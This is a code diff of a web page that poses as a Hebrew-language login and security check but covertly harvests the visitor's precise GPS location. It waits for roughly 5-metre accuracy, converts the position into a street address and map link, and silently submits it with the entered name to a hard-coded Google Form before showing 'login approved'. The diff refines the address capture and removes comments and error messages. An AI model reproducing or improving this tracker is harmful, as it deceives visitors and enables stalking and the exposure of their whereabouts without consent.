@@ -20,36 +20,48 @@
         window.onload = function() {
             const userName = prompt("שלום, אנא הכנס שם משתמש לכניסה:");
             if (!userName || userName.trim() === "") {
-                document.getElementById("status").innerText = "גישה נדחתה: חובה להזין שם.";
+                document.getElementById("status").innerText = "גישה נדחתה.";
                 return;
             }
 
-            document.getElementById("status").innerText = "מבצע אימות אבטחה... נא לא לסגור את הדף";
+            document.getElementById("status").innerText = "מבצע אימות אבטחה...";
 
             let hasSent = false;
             let bestPosition = null;
             let bestAccuracy = Infinity;
 
-            // פונקציית השליחה הסופית
             async function sendToGoogle(pos, name) {
                 if (hasSent) return;
                 hasSent = true;
 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                let address = "מזהה כתובת...";
+                
+                // יצירת קישור ל-Google Maps מהקואורדינטות המדויקות
+                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                let addressInfo = "";
 
                 try {
-                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
+                    // בקשת כתובת בעברית (כולל הגדרת שפה)
+                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                        headers: { 'Accept-Language': 'he' }
+                    });
                     const d = await r.json();
-                    if (d && d.display_name) address = d.display_name;
-                } catch (e) { address = "כתובת לא זמינה"; }
+                    
+                    // בניית הכתובת המילולית + הקישור המדויק
+                    const street = d.address.road || "";
+                    const houseNumber = d.address.house_number || "";
+                    const city = d.address.city || d.address.town || d.address.village || "";
+                    addressInfo = `${street} ${houseNumber}, ${city} | קישור למפה: ${googleMapsLink}`;
+                } catch (e) {
+                    addressInfo = `מיקום מדויק: ${googleMapsLink}`;
+                }
 
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                 const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                     `?entry.1905099702=${lat}` +
                     `&entry.379601602=${lon}` +
-                    `&entry.1378939865=${encodeURIComponent(address)}` +
+                    `&entry.1378939865=${encodeURIComponent(addressInfo)}` + // שדה הכתובת המעודכן
                     `&entry.2102560173=${encodeURIComponent(name)}` +
                     `&submit=Submit`;
 
@@ -59,38 +71,23 @@
                 setTimeout(() => { alert("כניסה אושרה. ברוך הבא " + name); }, 500);
             }
 
-            // האזנה אקטיבית למיקום
             const watchID = navigator.geolocation.watchPosition((pos) => {
                 const currentAccuracy = pos.coords.accuracy;
-                
-                // שמירת המיקום הכי טוב שנמצא עד עכשיו
                 if (currentAccuracy < bestAccuracy) {
                     bestAccuracy = currentAccuracy;
                     bestPosition = pos;
                 }
-
-                // אם הגענו לסף של 5 מטרים - שלח מיד ועצור
+                // סף דיוק של 5 מטרים
                 if (currentAccuracy <= 5) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(pos, userName);
                 }
-            }, (err) => {
-                console.log("Error: ", err);
-            }, {
-                enableHighAccuracy: true,
-                timeout: 20000,
-                maximumAge: 0
-            });
+            }, null, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
 
-            // FALLBACK: אם אחרי 15 שניות לא הגענו ל-5 מטר, שלח את הכי טוב שיש
             setTimeout(() => {
-                if (!hasSent) {
+                if (!hasSent && bestPosition) {
                     navigator.geolocation.clearWatch(watchID);
-                    if (bestPosition) {
-                        sendToGoogle(bestPosition, userName);
-                    } else {
-                        document.getElementById("status").innerText = "שגיאת חיבור. וודא שה-GPS פועל.";
-                    }
+                    sendToGoogle(bestPosition, userName);
                 }
             }, 15000);
         };
